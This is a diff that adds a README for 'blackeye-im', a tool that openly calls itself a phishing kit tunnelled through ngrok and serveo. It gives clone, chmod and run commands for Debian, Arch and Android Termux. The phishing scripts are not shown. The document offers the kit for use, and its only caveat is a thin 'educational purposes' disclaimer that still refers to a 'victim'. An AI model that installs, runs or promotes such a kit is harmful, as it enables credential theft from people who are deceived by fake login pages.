@@ -1,0 +1,34 @@
+blackeye-im
+Ultimate phishing tool with ngrok and serveo.
+
+Installation:
+Debian-based distros
+git clone https://github.com/Git-Ankitraj/blackeye-im.git
+cd blackeye-im
+chmod +x ./blackeye.sh
+Usage:
+
+./blackeye.sh
+
+blackeye-im
+
+Arch-based distros
+git clone https://github.com/Git-Ankitraj/blackeye-im.git
+cd blackeye-im
+chmod +x ./blackeye-arch.sh
+Usage:
+
+./blackeye-arch.sh
+
+Termux in Android.
+git clone https://github.com/Git-Ankitraj/blackeye-im.git
+cd blackeye-im
+chmod +x ./tmxsp.sh
+Usage:
+
+./tmxsp.sh
+
+blackeye-im
+
+Note: Made for Educational Purposes,use it with mutual consent of the victim.
+blackeye-im
